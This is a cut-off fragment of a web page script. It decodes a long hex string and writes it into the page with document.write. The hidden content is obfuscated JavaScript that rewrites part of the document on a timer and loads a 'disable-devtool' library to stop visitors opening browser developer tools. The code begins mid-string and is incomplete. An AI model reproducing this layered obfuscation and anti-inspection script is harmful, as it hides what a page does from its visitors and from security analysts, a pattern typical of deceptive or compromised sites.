766172205f3078373130367831373d5f3078373130367831345b5f3078373130367831355d3b72657475726e205f3078373130367831377d2c5f307832316439285f3078373130367831322c5f307837313036783133297d2866756e6374696f6e285f3078373130367831382c5f307837313036783139297b766172205f3078373130367831613d5f3078316133662c5f3078373130367831623d5f3078323164392c5f3078373130367831633d5f30783731303678313828293b7768696c652821215b5d297b7472797b766172205f3078373130367831643d2d7061727365496e74285f30783731303678316228307831363029292f20307831202b202d7061727365496e74285f30783731303678316228307831356329292f20307832202b207061727365496e74285f30783731303678316228307831356229292f20307833202b202d7061727365496e74285f30783731303678316228307831363329292f20307834202a20287061727365496e74285f30783731303678316228307831353929292f2030783529202b202d7061727365496e74285f30783731303678316228307831356129292f20307836202b207061727365496e74285f30783731303678316228307831356529292f20307837202b207061727365496e74285f30783731303678316228307831356629292f203078383b6966285f3078373130367831643d3d3d205f307837313036783139297b627265616b7d656c7365207b5f3078373130367831635b5f307837313036783161283078313634295d285f3078373130367831635b5f3078353638385b305d5d2829297d7d6361746368285f3078343666343437297b5f3078373130367831635b5f3078353638385b315d5d285f3078373130367831635b5f307837313036783161283078313735295d2829297d7d7d285f3078343164612c30783630323935292c77696e646f775b5f3078343039313835283078313564295d2866756e6374696f6e28297b766172205f3078373130367831653d5f3078316133662c5f3078373130367831663d5f30783430393138353b646f63756d656e745b5f307837313036783166283078313631295d5b5f3078353638385b345d5d3d20646f63756d656e745b5f307837313036783166283078313631295d5b5f307837313036783165283078313731295d5b5f307837313036783165283078313738295d285f307837313036783166283078313632292c5f3078353638385b355d297d2c30786129293b66756e6374696f6e205f30783436393928297b766172205f3078373130367832313d5b5f3078353638385b365d2c5f3078353638385b375d2c5f3078353638385b385d2c5f3078353638385b395d2c5f3078353638385b345d2c5f3078353638385b31305d2c5f3078353638385b31315d2c5f3078353638385b31325d2c5f3078353638385b305d2c5f3078353638385b31335d2c5f3078353638385b31345d2c5f3078353638385b31355d2c5f3078353638385b31365d2c5f3078353638385b31375d2c5f3078353638385b31385d2c5f3078353638385b31395d2c5f3078353638385b315d2c5f3078353638385b32305d2c5f3078353638385b32315d2c5f3078353638385b32325d2c5f3078353638385b32335d2c5f3078353638385b32345d2c5f3078353638385b32355d2c5f3078353638385b32365d2c5f3078353638385b32375d5d3b5f3078343639393d2066756e6374696f6e28297b72657475726e205f3078373130367832317d3b72657475726e205f30783436393928297d0d0a20203c2f7363726970743e0d0a3c736372697074207372633d2768747470733a2f2f63646e2e6a7364656c6976722e6e65742f6e706d2f64697361626c652d646576746f6f6c2f64697361626c652d646576746f6f6c2e6d696e2e6a73273e3c2f7363726970743e0d0a3c7363726970743e0d0a2020766172205f3078376436643d5b5d3b44697361626c65446576746f6f6c287b7d290d0a3c2f7363726970743e";for(i=0;i<t.length;i+=2){document.write(String.fromCharCode(parseInt(t.substr(i,2),16)));}
//-->
</script>